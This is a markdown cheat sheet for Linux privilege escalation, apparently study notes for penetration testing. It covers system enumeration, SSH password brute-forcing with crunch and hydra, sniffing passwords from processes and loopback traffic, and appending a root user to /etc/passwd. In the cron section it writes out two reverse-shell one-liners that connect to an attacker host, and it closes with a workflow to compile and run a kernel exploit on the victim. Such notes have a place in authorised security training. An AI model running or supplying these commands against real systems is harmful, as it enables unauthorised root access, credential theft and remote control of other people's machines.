# Linux Privilege Escalation

## Manual enumeration

Commands:
- `id`
- `cat /etc/passwd`
- `hostname`
- `cat /etc/issue`
- `cat /etc/os-realease`
- `uname -a`
- `ps aux`
- `ip a`
- `routel`
- `ss -anp`
- `cat /etc/iptables/rules.v4`
- `ls -lah /etc/cron*`
- `crontab -l`
- `sudo crontab -l`
- `dpkg -l`
- `find / -writable -type d 2> /dev/null`
- `cat /etc/fstab`
- `mount`
- `lsblk`
- `lsmod`
- `/sbin/modinfo some_kernel_module`
- `find / -perm -u=s -type f 2> /dev/null`

## Automated enumeration

Initial baseline:
```
/usr/bin/unix-privesc-check
```
Check for example writable config files.

Other tools:
- LinEnum: https://github.com/rebootuser/LinEnum
- LinPeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

## Credentials

### Hidden in text files

Check:
- `env`
- `cat .bashrc`
- `su - root`
- `sudo -l`

### Brute force ssh with password hints

With a hint of password:
```
crunch 19 19 -t Hint_Of_Password%%% > wordlist
hydra -l user -P wordlist $VictimIP -t 4 ssh -V
```

### Hidden passwords in Services

```
watch -n1 "ps aux | grep pass | grep -v grep | fold -s
sudo tcpdump -i lo -A | grep "pass"
```

## Cron jobs

If the cron job is writeable, add a reverse shell:
```
bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc $AttackerIp $AttackerPort > /tmp/f
```
Rshells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Passwd file

```
openssl passwd passwordtohash
echo "newadmin:somehashstring:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Capabilities

References:
- https://man7.org/linux/man-pages/man7/capabilities.7.html
- https://gtfobins.github.io/
```
/usr/sbin/getcap -r / 2> /dev/null
```

## SUID

Source: https://gtfobins.github.io/
```
find / -perm /6000 -exec ls -ld {} \; # setuid + setgid
grep Uid /proc/some_proc_number/status
ls -asl /usr/bin/some_binary
```

## Sudo

```
searchsploit -u
searchsploit "Linux kernel 4.4.0 privilege escalation"
cp /usr/share/exploitdb/exploits/linux/local/num.c .
gcc num.c
scp a.out victim@IP:
./a.out
```




